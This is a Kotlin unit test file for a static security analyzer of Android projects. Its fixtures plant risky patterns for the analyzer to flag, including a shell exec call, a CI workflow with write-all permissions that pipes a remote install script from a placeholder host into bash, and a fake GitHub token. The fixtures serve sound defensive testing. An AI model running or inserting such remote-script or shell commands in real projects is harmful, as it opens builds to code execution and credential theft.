package app.nestro.coworkbench

import java.io.File
import java.nio.file.Files
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

class CoworkbenchStaticAnalyzerTest {
    @Test
    fun scansManifestPermissionsDependenciesAndSensitiveApis() {
        val root = Files.createTempDirectory("nestro-coworkbench-analysis").toFile()
        try {
            root.resolve("app/src/main/AndroidManifest.xml").apply {
                parentFile.mkdirs()
                writeText(
                    """<manifest>
                        <uses-permission android:name="android.permission.CAMERA" />
                        <application android:allowBackup="true">
                            <activity android:exported="true" />
                        </application>
                    </manifest>""".trimIndent()
                )
            }
            root.resolve("app/build.gradle.kts").writeText(
                """dependencies {
                    implementation("org.example:demo:1.+")
                }"""
            )
            root.resolve("settings.gradle.kts").writeText(
                """repositories {
                    maven {
                        url = uri("https://repo.example.invalid/releases")
                    }
                }"""
            )
            root.resolve("app/src/main/Example.kt").apply {
                parentFile.mkdirs()
                writeText("Runtime.getRuntime().exec(\"sh\")")
            }

            val report = CoworkbenchStaticAnalyzer.analyze(root)
            assertTrue(report.scannedFiles >= 3)
            assertTrue(report.dependencyDeclarations.any { it.contains("org.example:demo:1.+") })
            assertTrue(report.findings.any { it.category == "Manifest 权限" })
            assertTrue(report.findings.any { it.category == "导出组件" })
            assertTrue(report.findings.any { it.category == "命令执行" && it.level == CoworkbenchFindingLevel.HIGH })
            assertTrue(report.findings.any { it.category == "依赖版本" })
            assertTrue(report.findings.any { it.category == "依赖仓库" && it.path == "settings.gradle.kts" })
        } finally {
            root.deleteRecursively()
        }
    }

    @Test
    fun marksPerFileLineLimitAsTruncated() {
        val root = Files.createTempDirectory("nestro-coworkbench-line-bound").toFile()
        try {
            root.resolve("src/main/Large.kt").apply {
                parentFile.mkdirs()
                writeText((1..2_100).joinToString("\n") { "val label$it = \"value\"" })
            }
            val report = CoworkbenchStaticAnalyzer.analyze(root)
            assertEquals(1, report.scannedFiles)
            assertTrue(report.truncated)
        } finally {
            root.deleteRecursively()
        }
    }

    @Test
    fun skipsBuildAndGitDirectoriesAndReportsBoundedScan() {
        val root = Files.createTempDirectory("nestro-coworkbench-bounds").toFile()
        try {
            root.resolve(".git/config").apply { parentFile.mkdirs(); writeText("http://ignored.example") }
            root.resolve("build/generated/Generated.kt").apply { parentFile.mkdirs(); writeText("http://ignored.example") }
            root.resolve("src/main/Allowed.kt").apply { parentFile.mkdirs(); writeText("https://example.com") }

            val report = CoworkbenchStaticAnalyzer.analyze(root)
            assertEquals(1, report.scannedFiles)
            assertFalse(report.findings.any { it.evidence.contains("ignored.example") })
            assertFalse(report.truncated)
        } finally {
            root.deleteRecursively()
        }
    }
    @Test
    fun comparesProposedManifestPermissionsAndExportedComponents() {
        val root = Files.createTempDirectory("nestro-coworkbench-manifest-diff").toFile()
        try {
            root.resolve("app/src/main/AndroidManifest.xml").apply {
                parentFile.mkdirs()
                writeText("""<manifest>
                    <uses-permission android:name="android.permission.CAMERA" />
                    <application>
                        <activity android:name=".HomeActivity" android:exported="false" />
                    </application>
                </manifest>""".trimIndent())
            }
            val after = """<manifest>
                <uses-permission android:name="android.permission.CAMERA" />
                <uses-permission android:name="android.permission.SEND_SMS" />
                <application android:debuggable="true">
                    <service android:name=".RemoteService" android:exported="true" />
                    <activity-alias android:name=".LauncherAlias" android:exported="true" />
                </application>
            </manifest>""".trimIndent()
            val impact = CoworkbenchStaticAnalyzer.analyzeProposalsWithBaseline(
                root,
                listOf(CoworkbenchProposal("app/src/main/AndroidManifest.xml", after))
            )
            assertEquals(listOf("android.permission.SEND_SMS"), impact.permissionsAdded)
            assertTrue(impact.findings.any { it.category == "新增导出组件" && it.evidence == "activity-alias:.LauncherAlias" && it.level == CoworkbenchFindingLevel.HIGH })
            assertTrue(impact.findings.any { it.category == "启用调试模式" })
        } finally {
            root.deleteRecursively()
        }
    }

    @Test
    fun comparesAddedAndRemovedGradleDependencies() {
        val root = Files.createTempDirectory("nestro-coworkbench-dependency-diff").toFile()
        try {
            root.resolve("app/build.gradle.kts").apply {
                parentFile.mkdirs()
                writeText("""dependencies {
                    implementation("org.example:old:1.0")
                }""".trimIndent())
            }
            val after = """dependencies {
                implementation("org.example:new:2.+")
            }""".trimIndent()
            val impact = CoworkbenchStaticAnalyzer.analyzeProposalsWithBaseline(
                root,
                listOf(CoworkbenchProposal("app/build.gradle.kts", after))
            )
            assertTrue(impact.dependenciesAdded.any { it.contains("org.example:new:2.+") })
            assertTrue(impact.dependenciesRemoved.any { it.contains("org.example:old:1.0") })
            assertTrue(impact.findings.any { it.category == "新增构建依赖" && it.level == CoworkbenchFindingLevel.HIGH })
        } finally {
            root.deleteRecursively()
        }
    }

    @Test
    fun detectsDynamicLoadingUnsafeDeserializationWeakCryptoAndWebViewExposure() {
        val root = Files.createTempDirectory("nestro-coworkbench-dangerous-apis").toFile()
        try {
            root.resolve("src/main/Dangerous.kt").apply {
                parentFile.mkdirs()
                writeText("""
                    val loader = DexClassLoader(path, optimizedDir, null, classLoader)
                    val value = ObjectInputStream(input).readObject()
                    val cipher = Cipher.getInstance("AES/ECB/PKCS5Padding")
                    webSettings.setAllowUniversalAccessFromFileURLs(true)
                    val pending = PendingIntent.FLAG_MUTABLE
                """.trimIndent())
            }
            val report = CoworkbenchStaticAnalyzer.analyze(root)
            assertTrue(report.findings.any { it.category == "动态代码加载" && it.level == CoworkbenchFindingLevel.HIGH })
            assertTrue(report.findings.any { it.category == "不安全反序列化" && it.level == CoworkbenchFindingLevel.HIGH })
            assertTrue(report.findings.any { it.category == "弱加密配置" })
            assertTrue(report.findings.any { it.category == "WebView 文件/混合内容访问" && it.level == CoworkbenchFindingLevel.HIGH })
            assertTrue(report.findings.any { it.category == "可变 PendingIntent" })
        } finally {
            root.deleteRecursively()
        }
    }

    @Test
    fun detectsCredentialsWithoutCopyingSecretValuesIntoEvidence() {
        val root = Files.createTempDirectory("nestro-coworkbench-secret-scan").toFile()
        try {
            val secret = "ghp_" + "A".repeat(36)
            root.resolve("src/main/Config.kt").apply {
                parentFile.mkdirs()
                writeText("""val apiKey = "$secret"
                    |val access_token = "token-value-123456789"
                """.trimMargin())
            }
            val report = CoworkbenchStaticAnalyzer.analyze(root)
            val findings = report.findings.filter { it.category == "疑似硬编码凭据" }
            assertTrue(findings.isNotEmpty())
            assertTrue(findings.all { !it.evidence.contains(secret) })
            assertTrue(findings.all { it.evidence.contains("[REDACTED]") })
        } finally {
            root.deleteRecursively()
        }
    }

    @Test
    fun flagsUntrustedWorkflowTriggersAndMutableActions() {
        val root = Files.createTempDirectory("nestro-coworkbench-workflow").toFile()
        try {
            root.resolve(".github/workflows/checks.yml").apply {
                parentFile.mkdirs()
                writeText("""name: checks
on: pull_request_target
permissions: write-all
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
      - run: curl https://example.invalid/install.sh | bash
""".trimIndent())
            }
            val report = CoworkbenchStaticAnalyzer.analyze(root)
            assertTrue(report.findings.any { it.category == "CI 触发边界" && it.level == CoworkbenchFindingLevel.HIGH })
            assertTrue(report.findings.any { it.category == "CI Action 未固定摘要" })
            assertTrue(report.findings.any { it.category == "CI 权限" && it.level == CoworkbenchFindingLevel.HIGH })
            assertTrue(report.findings.any { it.category == "远程脚本执行" && it.level == CoworkbenchFindingLevel.HIGH })
        } finally {
            root.deleteRecursively()
        }
    }

    @Test
    fun comparesGradleVersionCatalogAliasesAndVersionRefs() {
        val root = Files.createTempDirectory("nestro-coworkbench-catalog-diff").toFile()
        try {
            root.resolve("gradle/libs.versions.toml").apply {
                parentFile.mkdirs()
                writeText("""[versions]
core = "1.0"

[libraries]
core-lib = { group = "org.example", name = "core", version.ref = "core" }
""".trimIndent())
            }
            val after = """[versions]
core = "2.0"

[libraries]
core-lib = { group = "org.example", name = "core", version.ref = "core" }
""".trimIndent()
            val impact = CoworkbenchStaticAnalyzer.analyzeProposalsWithBaseline(
                root,
                listOf(CoworkbenchProposal("gradle/libs.versions.toml", after))
            )
            assertTrue(impact.dependenciesAdded.any { it.contains("catalog-value:core:2.0") })
            assertTrue(impact.dependenciesRemoved.any { it.contains("catalog-value:core:1.0") })
            assertTrue(impact.dependenciesAdded.any { it.contains("catalog:core-lib:org.example:core:core") })
        } finally {
            root.deleteRecursively()
        }
    }

    @Test
    fun detectsMultilineVersionCatalogLibraryCoordinatesAndVersionReferences() {
        val root = createTempDir(prefix = "nestro-coworkbench-catalog-")
        try {
            val catalog = File(root, "gradle/libs.versions.toml")
            catalog.parentFile?.mkdirs()
            catalog.writeText(
                """
                [versions]
                compose = "1.7.0"

                [libraries.androidx-compose-runtime]
                module = "androidx.compose.runtime:runtime"
                version.ref = "compose"
                """.trimIndent()
            )
            val report = CoworkbenchStaticAnalyzer.analyze(root)
            assertTrue(report.dependencyDeclarations.any {
                it.contains("catalog:androidx-compose-runtime:androidx.compose.runtime:runtime:version-ref:compose")
            })
        } finally {
            root.deleteRecursively()
        }
    }

}
